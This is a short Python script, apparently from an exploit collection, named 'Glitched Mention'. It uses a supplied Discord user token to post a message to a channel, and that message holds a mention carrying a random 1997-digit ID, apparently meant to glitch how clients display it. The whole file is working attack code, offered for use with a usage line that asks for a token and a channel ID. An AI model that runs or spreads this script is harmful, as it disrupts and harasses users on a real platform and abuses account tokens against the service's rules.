# Name: Glitched Mention 
# Description: Send a glitched generated mention
# Author: checksum (@0daySkid)
# Original founder: checksum?

import requests
import random
import string
import sys

class Exploit:

    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}


    def execute(self):
        """ send weird mention """
        _id = ''.join(random.choice(string.digits) for _ in range(1997))
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': f'<@{_id}>'})

    
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]

    exploit = Exploit(token, channel_id)

    exploit.execute()


if __name__ == '__main__':
    main()
